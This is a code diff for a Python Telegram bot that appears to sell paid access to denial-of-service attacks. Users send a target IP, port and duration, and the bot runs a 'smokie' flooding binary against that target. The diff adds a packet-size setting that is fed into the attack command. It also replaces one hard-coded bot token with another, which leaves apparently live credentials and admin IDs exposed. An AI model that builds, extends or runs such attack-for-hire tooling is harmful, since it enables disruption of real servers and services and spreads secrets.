@@ -26,8 +26,9 @@ KEY_PRICES = {
     'week': 500  # 500 Rs per week
 }
 ADMIN_IDS = [1949883614, 6210257893]
-BOT_TOKEN = "7379819567:AAFCB_C9NseUkYQkb_RIf-XquQ7_VbgSDZY"
+BOT_TOKEN = "8169032486:AAE_EFvq0FGrbic4bo7aCoy07abgf2201aE"
 thread_count = 50
+packet_size = 9
 ADMIN_FILE = 'admin_data.json'
 
 def load_admin_data():
@@ -248,6 +249,35 @@ def set_thread_count(message):
     bot.send_message(chat_id, "*Please specify the thread count.*", parse_mode='Markdown')
     bot.register_next_step_handler(message, process_thread_command)
 
+@bot.message_handler(commands=['packet'])
+def set_packet_size(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+
+    # Only super admins can change packet size settings
+    if not is_super_admin(user_id):
+        bot.send_message(chat_id, "*You are not authorized to change packet size settings.*", parse_mode='Markdown')
+        return
+
+    bot.send_message(chat_id, "*Please specify the packet size.*", parse_mode='Markdown')
+    bot.register_next_step_handler(message, process_packet_command)
+
+def process_packet_command(message):
+    global packet_size
+    chat_id = message.chat.id
+
+    try:
+        new_packet_size = int(message.text)
+        
+        if new_packet_size <= 0:
+            bot.send_message(chat_id, "*Packet size must be a positive number.*", parse_mode='Markdown')
+            return
+
+        packet_size = new_packet_size
+        bot.send_message(chat_id, f"*Packet size set to {packet_size} for Smokie.*", parse_mode='Markdown')
+
+    except ValueError:
+        bot.send_message(chat_id, "*Invalid packet size. Please enter a valid number.*", parse_mode='Markdown')
 
 def process_thread_command(message):
     global thread_count
@@ -270,11 +300,16 @@ blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 
 async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id):
     try:
-        # Construct command for Smokie binary with thread count
-        command = f"./smokie {target_ip} {target_port} {duration} {thread_count}"
+        # Construct command for Smokie binary with thread count and packet size
+        command = f"./smokie {target_ip} {target_port} {duration} {packet_size} {thread_count}"
 
         # Send initial attack message
-        bot.send_message(chat_id, f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗜𝗻𝗶𝘁𝗶𝗮𝘁𝗲𝗱!\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}:{target_port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} seconds\nThreads: {thread_count}")
+        bot.send_message(chat_id, 
+            f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗜𝗻𝗶𝘁𝗶𝗮𝘁𝗲𝗱!\n\n"
+            f"𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}:{target_port}\n"
+            f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} seconds\n"
+            f"𝗧𝗵𝗿𝗲𝗮𝗱𝘀: {thread_count}\n"
+            f"𝗣𝗮𝗰𝗸𝗲𝘁 𝗦𝗶𝘇𝗲: {packet_size}")
 
         # Create and run process without output
         process = await asyncio.create_subprocess_shell(
@@ -287,10 +322,14 @@ async def run_attack_command_on_codespace(target_ip, target_port, duration, chat
         await process.wait()
 
         # Send completion message
-        bot.send_message(chat_id, f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀\nThreads: {thread_count}")
+        bot.send_message(chat_id, 
+            f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀\n"
+            f"Threads: {thread_count}\n"
+            f"Packet Size: {packet_size}")
 
     except Exception as e:
         bot.send_message(chat_id, "Failed to execute the attack. Please try again later.")
+
 
 
 @bot.message_handler(commands=['Attack'])
@@ -507,6 +546,7 @@ def send_welcome(message):
             f"/remove - Remove user\n"
             f"/users - List all users\n"
             f"/thread - Set thread count\n"
+            f"/packet - Set packet size\n"
         )
     elif is_admin(user_id):
         balance = get_admin_balance(user_id)
